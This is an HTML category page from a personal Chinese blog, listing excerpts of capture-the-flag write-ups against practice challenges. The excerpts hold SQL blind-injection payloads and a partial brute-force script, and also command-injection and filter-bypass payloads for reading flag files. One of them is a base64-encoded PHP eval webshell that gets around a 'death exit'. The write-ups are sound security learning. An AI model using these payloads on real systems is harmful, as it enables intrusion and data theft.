@@ -1,0 +1,279 @@
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>CTF | Yiming</title>
+<meta name=keywords content>
+<meta name=description content="Yiming' blog">
+<meta name=author content="Me">
+<link rel=canonical href=https://shenyimings.github.io/categories/ctf/>
+<meta name=google-site-verification content="XYZabc">
+<meta name=yandex-verification content="XYZabc">
+<meta name=msvalidate.01 content="XYZabc">
+<link href=/assets/css/stylesheet.min.746a86b58bb2b052b5e4df8216510494f04f81e62c08d626150c26c69ca929da.css integrity="sha256-dGqGtYuysFK15N+CFlEElPBPgeYsCNYmFQwmxpypKdo=" rel="preload stylesheet" as=style>
+<link rel=icon href=https://shenyimings.github.io/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://shenyimings.github.io/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://shenyimings.github.io/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://shenyimings.github.io/apple-touch-icon.png>
+<link rel=mask-icon href=https://shenyimings.github.io/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.90.1">
+<link rel=alternate type=application/rss+xml href=https://shenyimings.github.io/categories/ctf/index.xml>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css integrity=sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X crossorigin=anonymous>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js integrity=sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4 crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js integrity=sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa crossorigin=anonymous onload=renderMathInElement(document.body)></script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-123-45','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+<meta property="og:title" content="CTF">
+<meta property="og:description" content="Yiming' blog">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://shenyimings.github.io/categories/ctf/"><meta property="og:image" content="https://shenyimings.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="og:site_name" content="Yiming">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://shenyimings.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
+<meta name=twitter:title content="CTF">
+<meta name=twitter:description content="Yiming' blog">
+</head>
+<body class=list id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<noscript>
+<style type=text/css>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://shenyimings.github.io/ accesskey=h title="Yiming'blog (Alt + H)">
+<img src=/apple-touch-icon.png alt=logo aria-label=logo height=35>Yiming'blog</a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu onscroll=menu_on_scroll()>
+<li>
+<a href=https://shenyimings.github.io/archives/ title=归档>
+<span>归档</span>
+</a>
+</li>
+<li>
+<a href=https://shenyimings.github.io/categories/ title=分类>
+<span>分类</span>
+</a>
+</li>
+<li>
+<a href=https://shenyimings.github.io/tags/ title=标签>
+<span>标签</span>
+</a>
+</li>
+<li>
+<a href=https://shenyimings.github.io/search/ title="搜索 (Alt + /)" accesskey=/>
+<span>搜索</span>
+</a>
+</li>
+<li>
+<a href=https://shenyimings.github.io/about/ title=关于>
+<span>关于</span>
+</a>
+</li></ul>
+</nav>
+</header>
+<main class=main>
+<header class=page-header>
+<div class=breadcrumbs>
+<a href=https://shenyimings.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://shenyimings.github.io/categories/>Categories</a>
+</div>
+<h1>CTF</h1>
+</header>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+Bugku-SQL注入-WriteUP
+</h2>
+</header>
+<section class=entry-content>
+<p>题目网址：sql注入
+一个很正经的界面，有实战那味了。
+上来先尝试经典组合：
+admin~password
+很幸运，用户名猜中了。
+利用单引号检测是否存在SQL注入
+admin' or 1 = 1
+报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：
+'
+or
+&lt;>(不等号)
+#
+()
+空格可用括号代替，等号可用相反的不等号
+先尝试是否存在布尔注入：
+成功，用户名存在注入~
+之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）
+select password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload
+1'or((ascii(mid((select(password)from(admin))from(1))))&lt;>9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难
+我们尝试下集束炸弹，让两个参数都作为目标
+第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码
+爆破成功了。。。
+接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：
+4dcc88f8f1bc05e7c2ad1a60288481a2
+去md5破解站破解一下，成功解出密码：
+bugkuctf
+结束了……
+反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。
+贴一组大神的python自动脚本，以供学习
+#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = 'http://114.67.246.176:19665/' sss = string.digits + (string.ascii_lowercase) a = '' for i in range(1, 50): flag = 0 for j in sss: payload = "admin'^((ascii(mid((select(password)from(admin))from(%s))))&lt;>%s)^1#" % (i, ord(j)) #屏蔽了","，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #&lt;>表示不等号 #^表示异或 payload2= "admin123'or((ascii(mid((select(password)from(admin))from(%s))))&lt;>%s)#"%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= "admin123'or((ascii(mid((select(database()))from(%s))))&lt;>%s)#"%(i,ord(j)) data = {'username': payload, 'password': 'admin'} res = requests....</p>
+</section>
+<footer class=entry-footer>
+October 24, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to Bugku-SQL注入-WriteUP" href=https://shenyimings.github.io/post/15.bugku-sql%E6%B3%A8%E5%85%A5/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+CNSS Recruit-Web Write UP
+</h2>
+</header>
+<section class=entry-content>
+<p>前言 躺在床上，不想动鼠标，那就先写写前言吧。
+这个CTF比赛是我打的第二场比较正规、完整的比赛。
+惨不忍睹，当然，作为刚入门的noob来说也可以接受。
+希望能通过笔记的整理消化新掌握的知识，道阻且长。
+[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。
+关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.
+python2 .\GitHack.py http:\\x.x.x\.git 运行后即得到git目录。
+Git版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。
+git log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。
+其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。
+[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。
+第一反应是绕过和注入咯，尝试后无果。
+再观察续一秒按钮前端代码，发现是安慰剂按钮。。。
+那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：
+import requests import re # 正则表达式库 import string from requests.sessions import session url = 'http://81.68.109.40:30005/' session = requests....</p>
+</section>
+<footer class=entry-footer>
+October 21, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to CNSS Recruit-Web Write UP" href=https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+RCE 远程命令执行漏洞
+</h2>
+</header>
+<section class=entry-content>
+<p>本文以CTF-show Web入门29-41题作为例题，学习RCE相关知识。
+Web 29 过滤了flag字样
+?c=system("cat f*");
+Web 30 过滤了flag|system|php三个关键字，flag和php是待执行命令文本， 可以通过引号、斜杠或反斜杠绕过
+echo `cat f\lag.ph\p`; 反引号可以执行系统命令
+Web 31 在cat被禁时，我们还可以采用如下命令
+1.tac：从最后一行开始显示，是cat的反向显示 2.more：一页一页的显示档案内容 3.less：与more类似 4.head：查看文档的前几行 5.tail：查看文档的后几行 6.nl：显示的时候，顺便输入行号 7.od：以二进制的方式读取档案内容 8.vi：一种编辑器 9.uniq：查看 10.vim：一种编译器
+空格的代替符号：
+1.${IFS}
+2.$IFS$1
+3.${IFS
+4.%20
+5.&lt;和&lt;>重定向符
+6.%09
+构造本题payload
+?c=echo'more%09f*'; 其他题解：
+?c=eval($_GET[1]);&1=system('cat flag.php');嵌套脱离了c的正则判断 ?c=echo`strings%09f*`; ?c="\x73\x79\x73\x74\x65\x6d"("nl%09fl[a]*");等价于system()。这个学到了！ Web 32 屏蔽了echo
+分号可以用?>代替，括号可以用“”绕过，利用文件包含的方式查看flag.php，注意要先进行base64转码以绕过关键词过滤。
+?c=include"$_GET[1]"?>&1=php://filter/read=convert.base64- encode/resource=flag.php 绕过死亡EXIT - CNSS 太极掌门人 &lt;?php $filename=$_GET['filename']; $content=$_GET['content']; file_put_contents($filename,"&lt;?php exit();".$content); 两个参数变量间用exit()方法隔开，即使注入一句话也无法执行，如何绕过这个“死亡exit”？
+我们只需要将content前面部分内容使用某种手段(如编码)进行处理，导致PHP不能识别该部分即可。
+base64绕过 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。
+?filename=php://filter/convert.base64-decode/resource=1.php&content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== [😮Mid]太极掌门人 &lt;?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir !...</p>
+</section>
+<footer class=entry-footer>
+October 20, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to RCE 远程命令执行漏洞" href=https://shenyimings.github.io/post/13.rce%E4%B8%93%E6%A0%8F/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+MoeCTF 2021 西电新生赛WP
+</h2>
+</header>
+<section class=entry-content>
+<p>前言-2021/8/10 今天学长在群里发了西电的新生CTF比赛，题目较为基础，适合我们初学者。
+想来还是感慨颇多的，西电不愧是网安的头部院校，信安的新生还没入学就开始打CTF比赛了，我大二了才刚刚踏入大门而已。
+1. Web安全入门指北-GET &lt;?php include "flag.php"; $moe = $_GET['moe']; if ($moe == "flag") { echo $flag; }else { highlight_file(__FILE__); } 签到题。已给出源代码，根据题目提示，可以看出是一个简单的get命令题。
+在地址栏中发送get请求：
+http://47.93.215.154:10000/?moe=flag
+得到flag：
+moectf{We1c0me_t0_CTF_Web!}
+2. Web安全入门指北-POST &lt;?php include "flag.php"; $moe = $_POST['moe']; if ($moe == "flag") { echo $flag; }else { highlight_file(__FILE__); } 给出源代码，只需要发送post请求给moe变量赋值flag即可。
+用hackbar：
+在post参数里填入moe=flag
+Execute执行即可得flag:moectf{POST_1s_an_1mp0rtant_m3th0d!}
+3. Web安全入门指北-小饼干 这道题非常有意思，通过网页提示:
+You are not VIP,I will give flag to VIP!
+可以大致猜测要伪造某些访问项目，将非VIP改为VIP。
+用Burp Suite抓包得到，有一个cookie项为VIP=0，可以通过篡改VIP值来达到伪造cookies的目的。
+将抓包结果发送到重发器，将VIP值改为1，点击发送。
+得到flag。
+4. 2048 打开环境，发现是一个2048小游戏...</p>
+</section>
+<footer class=entry-footer>
+October 19, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to MoeCTF 2021 西电新生赛WP" href=https://shenyimings.github.io/post/12.moectf-web-write-up/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+CTF比赛方向选择
+</h2>
+</header>
+<section class=entry-content>
+<p>了解CTF CTF 的前身是传统黑客之间的网络技术比拼游戏，起源于 1996 年第四届 DEFCON。CTF比赛有以下突出特点：
+比赛侧重于对计算机底层和系统安全的核心能力，Web 漏洞攻防技巧完全被忽略。 竞赛环境趋向多 CPU 指令架构集，多操作系统，多编程语言。 采用「零和」计分规则。 团队综合能力考验：逆向分析、漏洞挖掘、漏洞利用、漏洞修补加固、网络流量分析、系统安全运行维护以及安全方面的编程调试。 CTF竞赛内容 常见六个分类
+Web - 网络攻防
+考察Web安全中的常见漏洞，如SQL注入、XSS、CSRF、文件包含、文件上传、代码审计。Web安全题型最为常见。
+RE - 逆向工程
+反编译、软件保护、反调试、软件加壳脱壳。
+PWN - 二进制漏洞
+与计算机操作系统底层相关，主要出现在Linux平台上。
+Crypto - 密码学
+古典密码与现代密码学安全两方面
+Mobile - 移动安全
+安卓逆向相关
+MISC - 安全杂项
+信息搜集（社工）、编码分析、取证分析、隐写分析等
+比赛学习方向选择 基于我个人对于六个分类的了解，我选择Web方向与Crypto方向。
+Web
+作为一个尝试过Minecraft自建服务器、外网vps搭梯子（学习用）、购置域名建WordPress小站、提取视频网站M3U8下载地址的ctf beginner，Web方向是我最为感兴趣和想学习的方向，也是我认为最有应用性和最能获得成就感的方向。Web方向知识面的广度很宽，涉及范围相当大，故而学习需要恒心。
+Crypto
+选择这个方向的原因很简单，我是目前所读专业即为信息安全（密码学方向） 故而此方向与学科所学相关，虽难但也必须披荆斩棘，筚路蓝缕。
+次要方向：PWN...</p>
+</section>
+<footer class=entry-footer>
+1 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to CTF比赛方向选择" href=https://shenyimings.github.io/post/3.ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/></a>
+</article>
+<footer class=page-footer>
+<nav class=pagination>
+<a class=next href=https://shenyimings.github.io/categories/ctf/page/2/>Next Page »</a>
+</nav>
+</footer>
+</main><footer class=footer>
+<span>&copy; 2021 <a href=https://shenyimings.github.io/>Yiming</a></span>
+<span>&#183;</span>
+<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span>
+<span>&#183;</span>
+<span>Theme <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)">
+<button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</button>
+</a>
+<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+</body>
+</html>
